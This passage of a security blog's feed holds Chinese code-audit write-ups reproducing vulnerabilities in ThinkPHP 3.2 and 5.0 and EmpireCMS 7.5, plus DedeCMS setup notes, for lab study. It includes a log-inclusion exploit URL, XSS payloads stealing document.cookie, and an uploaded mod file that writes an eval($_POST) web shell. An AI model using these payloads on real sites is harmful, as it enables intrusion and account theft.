class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($value=<span class="string">''</span>)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;assign($value);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;display();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>因为该漏洞利用的assign函数需要模板渲染，所以需要对应的模板文件，与demo相对应的文件路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\H</span>ome<span class="symbol">\V</span>iew<span class="symbol">\I</span>ndex<span class="symbol">\i</span>ndex.html</span><br><span class="line">/*此处的Index目录和index.html文件需自己创建</span><br><span class="line">index.html的内容任意</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>借用玄甲安全实验室的一张图，整体看一下程序的执行流程</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210909094308482.png" alt="image-20210909094308482"></p><p>接下来分析具体的代码：</p><p><code>Application/Home/Controller/IndexController.class.php</code></p><p>assign方法中第一个变量可控</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714144552762.png" alt="image-20210714144552762"></p><p>跟进assign函数</p><p><code>ThinkPHP/Library/Think/Controller.class.php</code></p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714145223478.png" alt="image-20210714145223478"></p><p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>中的assign函数，此时进入else分支，我们传进去的<code>$value</code>被赋值给<code>$this-&gt;tVar</code></p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714145158360.png" alt="image-20210714145158360"></p><p>返回后进入display函数，注意这是一个无参调用</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714145819669.png" alt="image-20210714145819669"></p><p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>的display函数，开始解析并获取模板文件内容，此时模板文件路径和内容为空</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714150822344.png" alt="image-20210714150822344"></p><p>进入<code>ThinkPHP/Library/Think/View.class.php</code>的fetch函数后，会先判断模板存不存在，这也是为什么我们要创建模板文件的原因</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714151415868.png" alt="image-20210714151415868"></p><p>接着判断是不是php类型模板，不是进入else分支。接着$params 被赋值，var即为为我们传进去的日志路径，file为模板文件的路径。</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714151836840.png" alt="image-20210714151836840"></p><p>接着进入<code>ThinkPHP/Library/Think/Hook.class.php</code>的listen函数，经过一些判断，进入exec函数</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714152708275.png" alt="image-20210714152708275"></p><p>接着exec函数把$params带进<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>的run函数处理</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153315655.png" alt="image-20210714153315655"></p><p>进入<code>ThinkPHP/Library/Think/Template.class.php</code>的fetch函数</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153522998.png" alt="image-20210714153522998"></p><p>进入最后的load函数，$var不为空则使用extract方法的EXTR_OVERWRITE默认描述对变量值进行覆盖，之后include该日志文件路径，造成文件包含。</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153704479.png" alt="image-20210714153704479"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li><p>日志包含</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154206984.png" alt="image-20210714154206984"></p><p>日志在<code>Application/Runtime/Logs/Home</code>目录下</p><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154445495.png" alt="image-20210714154445495"></p><p>开启debug</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求不报错 日志文件在 Application<span class="regexp">/Runtime/</span>Logs/Home下</span><br><span class="line">请求会报错 日志文件在 Application<span class="regexp">/Runtime/</span>Logs/Common下</span><br></pre></td></tr></table></figure><p>关闭debug</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求不会报错 不会记录日志</span><br><span class="line">请求会报错 日志文件在 Application/Runtime/Logs/<span class="meta">Common</span>下</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>上传入口</p><p>利用系统自带的上传功能，上传包含shell的文件</p></li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://x.x.x.x/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Common/21<span class="emphasis">_07_</span>14.log</span><br></pre></td></tr></table></figure><p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210716163001792.png" alt="image-20210716163001792"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ?st=529DABB1BC6F651382C9135EB552827AD43F0288831BAC943C5A6CE32F45F1B9F423FD767BD30EB98F9C2C6D962C1268BBC7A694FE6B1157BC89FD16D8EAEB81A3BD642BDC08DB57567E4C7B327B7134882308F36A811B338901B511ABC8BC487356659B2CD0C8417DBCFD448DE79A0E6611FC7DAA7F5F806AED95180ADE0D979653805D9BE2818C36432C242C346C258EB569D4B4EC38ACD08C5E03A09D4FAA34F60913522071EB3BEEED7BDB667730296BE92C3B10E13BA48209051A216A1E&vid=1688851206182100&cst=53928845F30E881CE4702F30E4E78E655B605169B1BF71E0E963E97B3C21D4A26131701E074B2422DE3B7150338D0234&deviceid=de960c8d-258f-4e7d-a333-c1e3dc351b70&version=3.1.8.3015&platform=win" target="_blank" rel="noopener">ThinkPHP3.2.x RCE漏洞通报</a> </p>]]></content>
    
    <summary type="html">
    
      ThinkPHP3.2的远程代码执行漏洞
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="复现" scheme="https://0xcreed.jxustctf.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="Thinkphp3" scheme="https://0xcreed.jxustctf.top/tags/Thinkphp3/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5-SQL注入漏洞分析</title>
    <link href="https://0xcreed.jxustctf.top/2021/03/%C2%96Thinkphp5-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0xcreed.jxustctf.top/2021/03/%C2%96Thinkphp5-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-03-20T03:17:28.000Z</published>
    <updated>2021-06-06T03:36:08.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>环境搭建卡了挺久的，这里记录一下。</p><ul><li><p>多版本的php</p><p>如果是Ubuntu，参考以下代码</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:ondrej/php    //添加仓库源</span><br><span class="line">sudo apt-get update  //更新源</span><br><span class="line">sudo apt-get install php5.6  //安装其他版本php</span><br><span class="line">sudo apt-get install php5.6-xdebug        //安装必须的插件</span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure><p>如果是kali，参考一下代码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install lsb-<span class="keyword">release</span> apt-transport-https ca-certificates </span><br><span class="line">sudo wget -O /etc/apt/<span class="keyword">trusted</span>.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg</span><br><span class="line">echo "deb https://packages.sury.org/php/ buster main" | sudo tee /etc/apt/sources.list.d/php.list</span><br></pre></td></tr></table></figure></li><li><p>composer</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">"copy('https://install.phpcomposer.com/installer', 'composer-setup.php');"</span></span><br><span class="line">php composer-setup.php</span><br><span class="line">mv composer.phar <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>composer</span><br><span class="line"><span class="regexp">//</span>记得加环境变量</span><br><span class="line"><span class="regexp">//</span>换源</span><br><span class="line">composer config -g repo.packagist composer https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/composer/</span></span><br></pre></td></tr></table></figure></li><li><p>安装tp5源码</p><p>这里以thinkphp v5.0.15为例</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cd </span>/<span class="string">var/</span><span class="string">www/</span></span><br><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="built_in">--prefer-dist</span> <span class="string">topthink/</span><span class="string">think=</span>5.0.<span class="string">15 </span><span class="string">tp5015</span></span><br><span class="line"><span class="string">cd </span><span class="string">tp5015</span></span><br><span class="line"><span class="string">vim </span><span class="string">composer.</span><span class="string">json </span>//将<span class="string">"topthink/framework"</span>:<span class="string">"5.0.*"</span> &gt;&gt;<span class="string">"topthink/framework"</span>:<span class="string">"5.0.15"</span></span><br><span class="line"><span class="string">composer </span><span class="string">update </span>  //可能会报<span class="string">php插</span>件缺失，缺啥装啥。</span><br><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="string">topthink/</span><span class="string">framework=</span>5.0.<span class="string">15 </span><span class="string">thinkphp </span>//这个<span class="string">"thinkphp"</span>名字不能改,可能会报依赖错误，按照提示修改<span class="string">thinkphp/</span><span class="string">composer.</span><span class="string">json</span></span><br><span class="line"><span class="string">cd </span><span class="string">thinkphp</span></span><br><span class="line"><span class="string">composer </span><span class="string">update</span></span><br></pre></td></tr></table></figure><p>至此源码全部下载下来了。</p></li><li><p>Apache</p><p>首先选择合适的php版本(&gt;5.4),我这里因为依赖问题所以选择7.0</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a2dismod php5<span class="number">.6</span>  <span class="comment">//关闭php5.6</span></span><br><span class="line">a2enmod php7<span class="number">.0</span>   <span class="comment">//开启php7.0</span></span><br><span class="line">systemctl restart apache2  <span class="comment">//重启生效</span></span><br></pre></td></tr></table></figure><p>创建虚拟目录  <code>/etc/apache2/sites-available/000-default.conf</code></p><p><img src="/2021/03/Thinkphp5-SQL注入漏洞分析/image-20210320163405433.png" alt="image-20210320163405433"></p><p>增加监听端口 <code>/etc/apache2/ports.conf</code>  </p><p><img src="/2021/03/Thinkphp5-SQL注入漏洞分析/image-20210320163814936.png" alt="image-20210320163814936"></p><p>创建日志目录(没有会导致apache服务重启失败)</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /<span class="built_in">var</span>/<span class="built_in">log</span>/apache2/tp5015</span><br><span class="line">systemctl <span class="built_in">restart</span> apache2</span><br></pre></td></tr></table></figure><p>大致的环境就是这样搭建的。遇到特殊情况就举一反三吧 - -!</p><p>在进行漏洞分析前我们先来了解下tp的路由有两种模式</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://serverName/index.php/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line"><span class="link">http://serverName/index.php?s=/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><ul><li><p>漏洞分析</p><p>漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。漏洞影响版本： <strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> 。</p><p>将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span></span><br><span class="line"><span class="php">        db(<span class="string">'users'</span>)-&gt;insert([<span class="string">'username'</span> =&gt; $username]);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>在 <strong>application/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>application/config.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。创建数据库信息如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> tp5015demo;</span><br><span class="line"><span class="keyword">use</span> tp5015demo;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line">true<span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">trueusername <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ul><ul><li>漏洞利用</li></ul><h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><h3 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h3><h3 id="SQL注入4"><a href="#SQL注入4" class="headerlink" title="SQL注入4"></a>SQL注入4</h3><h3 id="SQL注入5"><a href="#SQL注入5" class="headerlink" title="SQL注入5"></a>SQL注入5</h3><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>]]></content>
    
    <summary type="html">
    
      跟进ThinkPHP-Vuln项目，把tp5的SQL漏洞过一遍。
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="thinkphp" scheme="https://0xcreed.jxustctf.top/tags/thinkphp/"/>
    
      <category term="SQL" scheme="https://0xcreed.jxustctf.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>EmpireCMSv7.5代码审计</title>
    <link href="https://0xcreed.jxustctf.top/2021/03/EmpireCMSv7-5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://0xcreed.jxustctf.top/2021/03/EmpireCMSv7-5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2021-03-17T11:56:24.000Z</published>
    <updated>2021-03-22T07:05:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>环境上没遇到啥问题</p><h3 id="前台XSS"><a href="#前台XSS" class="headerlink" title="前台XSS"></a>前台XSS</h3><ul><li><p>漏洞分析</p><p>需要开启会员空间</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20212902.png" alt="屏幕截图 2021-03-18 212902"></p><p>问题代码在<code>/e/ViewImg/index.html</code> ，Request获取url的参数,没有经过任何过滤,直接当作a标签和img标签的href属性和src属性输出。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318214012537.png" alt="image-20210318214012537"></p><p>跟进<code>Request</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318215455754.png" alt="image-20210318215455754"></p><p>通过window.location获取当前url地址,根据传入的url参数,获取当前参数的起始位置和结束位置。</p><p>例如,<code>index.html?url=javascript:alert(document.cookie)</code>,经过Request函数处理就变成<code>javascript:alert(document.cookie)</code></p><p>url地址经过Request函数处理之后,然后把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值。</p><p>所以构造payload：<code>url=javascript:alert(/xss/)</code></p></li><li><p>漏洞复现</p><p>访问<code>http://172.16.43.200:9093/e/ViewImg/index.html?url=javascript:alert(/xss/)</code>,点击图片触发。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318220355099.png" alt="image-20210318220355099"></p></li></ul><a id="more"></a><h3 id="后台文件上传getshell-CVE-2018-18086"><a href="#后台文件上传getshell-CVE-2018-18086" class="headerlink" title="后台文件上传getshell(CVE-2018-18086 )"></a>后台文件上传getshell(CVE-2018-18086 )</h3><ul><li><p>漏洞分析</p><p>EmpireCMS  7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5版本中的<code>/e/class/moddofun.php</code>的<code>LoadInMod</code>函数存在安全漏洞,未对变量<code>$file</code>做任何处理，直接上传，接着就包含该文件。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20212415.png" alt="屏幕截图 2021-03-17 212415">        </p><p>对此我们直接全局寻找<code>LoadInMod</code>的调用，在<code>e/admin/ecmsmod.php</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220115927.png" alt="image-20210317220115927"></p></li><li><p>漏洞复现</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20220503.png" alt="屏幕截图 2021-03-17 220503">    </p><p>新建一个<code>1.mod</code>的文件，内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">"../data/getshell.php"</span>,<span class="string">"&lt;?php @eval(\$_POST[a]); ?&gt;"</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>上传成功后，即可得到shell</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220729395.png" alt="image-20210317220729395"></p></li></ul><h3 id="后台SQL执行getshell"><a href="#后台SQL执行getshell" class="headerlink" title="后台SQL执行getshell"></a>后台SQL执行getshell</h3><ul><li><p>漏洞分析</p><p>漏洞位于<code>e/admin/db/DoSql.php</code> 22行<code>DoExecSql</code>方法</p><p><code>$query</code>未经过任何处理就执行了</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20195309.png" alt="屏幕截图 2021-03-18 195309"></p><p><code>ClearAddsData</code>方法根据是否开启魔术引号来转义数据，这里我们不用管。跟进<code>RepSqlTbpre</code>方法，只做了前缀替换。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318200030207.png" alt="image-20210318200030207"></p><p>继续跟进<code>DoRunQuery</code>方法，替换<code>\r</code>,按<code>;</code>分割语句，然后就执行语句。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20200132.png" alt="屏幕截图 2021-03-18 200132"></p></li><li><p>漏洞利用</p><p>可以利用SQL语句写入shell，但利用难度很高。</p><p>首先需要开启mysql的<code>secure_file_priv</code> 默认是关闭的，修改my.conf文件, 在[mysqld] 下添加条目: <code>secure_file_priv =</code>,保存之后,然后重启mysql。</p><p>之后需要知道网站的绝对路径</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318211927366.png" alt="image-20210318211927366"></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318211959712.png" alt="image-20210318211959712"></p></li></ul><p>如果是站库分离影响实在有限。</p><h3 id="后台XSS"><a href="#后台XSS" class="headerlink" title="后台XSS"></a>后台XSS</h3><ul><li><p>漏洞分析</p><p>问题出在<code>e/admin/openpage/AdminPage.php</code>，获取<code>mainfile</code>，<code>leftfile</code>变量后，经过<code>hRepPostStr</code>处理后输出到页面</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319094155021.png" alt="image-20210319094155021"></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20182718.png" alt="屏幕截图 2021-03-19 182718"></p><p>跟进<code>hRepPostStr</code>方法</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20094520.png" alt="屏幕截图 2021-03-19 094520"></p><p>跟进<code>ehtmlspecialchars</code>,以<code>ENT_QUOTES</code>模式(既转换双引号也转换单引号)，转义HTML实体</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20181416.png" alt="屏幕截图 2021-03-19 181416"></p><p>跟进<code>CkPostStrChar</code>方法，结尾不能为 <code>\\</code>。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319181832873.png" alt="image-20210319181832873"></p><p>最后跟进<code>AddAddsData</code>方法，如果没有开启<code>magic_quotes_gpc</code>函数,就使用<code>addslashes</code>对参数中的特殊字符进行转义处理</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319182058498.png" alt="image-20210319182058498"></p></li><li><p>漏洞利用</p><p>访问<code>http://172.16.43.200:9093/e/admin/openpage/AdminPage.php?ehash_7NYw5=tJmMRJnmeKBHOPaBU04H&amp;mainfile=javascript:alert(document.cookie)</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319183728605.png" alt="image-20210319183728605"></p></li></ul><h3 id="后台任意代码执行"><a href="#后台任意代码执行" class="headerlink" title="后台任意代码执行"></a>后台任意代码执行</h3><ul><li><p>漏洞分析</p><p><code>e/admin/ebak/phome.php</code>接收备份数据库传递的参数,然后传递给<code>Ebak_DoEbak</code>方法中</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319201938388.png" alt="image-20210319201938388"></p><p>跟进<code>Ebak_DoEbak</code>，数据库表名传递给变量<code>$tablename</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20202302.png" alt="屏幕截图 2021-03-19 202302"></p><p>再经过<code>RepPostVar</code>处理，替换特殊字符，转义，防火墙过滤(默认上没有过滤字符)</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319203747991.png" alt="image-20210319203747991"></p><p>经过字符拼接赋值给<code>$d_table</code>，再拼接进<code>$string</code>最后写入php文件。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204115.png" alt="屏幕截图 2021-03-19 204115"></p></li><li><p>漏洞利用</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204313.png" alt="屏幕截图 2021-03-19 204313"></p><p>抓包修改<code>tablename</code>字段</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204718.png" alt="屏幕截图 2021-03-19 204718"></p><p>访问<code>config.php</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319204854229.png" alt="image-20210319204854229"></p></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/LEOGG321/p/13882655.html" target="_blank" rel="noopener">https://www.cnblogs.com/LEOGG321/p/13882655.html</a></p>]]></content>
    
    <summary type="html">
    
      帝国CMSv7.5漏洞分析
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="CMS" scheme="https://0xcreed.jxustctf.top/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMSv5.7SP2代码审计</title>
    <link href="https://0xcreed.jxustctf.top/2021/03/DedeCMSv5-7SP2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://0xcreed.jxustctf.top/2021/03/DedeCMSv5-7SP2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2021-03-10T01:13:38.000Z</published>
    <updated>2021-03-20T03:27:02.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>这里需要注意的是</p><p>dedecms在php5.4以上会因为session_register()等函数已移除，无法正常运行</p><p>在include/userlogin.class.php中代码替换,被替换代码大致在288到304行之间,代码如下:</p><p>代码如下:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserIDTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;userID;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserTypeTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;userType;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserChannelTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;userChannel;</span><br><span class="line"><span class="variable">@session_register</span>(<span 